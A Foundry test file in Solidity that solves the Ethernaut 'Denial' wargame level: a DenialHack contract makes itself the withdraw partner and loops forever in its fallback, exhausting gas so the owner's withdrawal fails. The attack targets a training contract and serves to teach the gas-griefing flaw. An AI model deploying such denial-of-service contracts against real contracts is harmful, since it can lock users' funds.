// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.14;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../src/DenialFactory.sol";
import "../src/Ethernaut.sol";

contract DenialTest is Test {
    Ethernaut ethernaut;
    address player = address(100);

    function setUp() public {
        ethernaut = new Ethernaut();
        vm.deal(player, 5 ether);
    }

    function testDenialHack() public {
        DenialFactory denialFactory = new DenialFactory();
        ethernaut.registerLevel(denialFactory);
        vm.startPrank(player);
        address levelAddress = ethernaut.createLevelInstance{
            value: 0.001 ether
        }(denialFactory);
        Denial ethernautDenial = Denial(payable(levelAddress));

        ethernautDenial.setWithdrawPartner(player);
        new DenialHack(levelAddress);

        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(
            payable(levelAddress)
        );
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}

contract DenialHack {
    Denial challenge;

    constructor(address _victim) {
        challenge = Denial(payable(_victim));
        challenge.setWithdrawPartner(address(this));
    }

    fallback() external payable {
        while (true) {}
    }
}
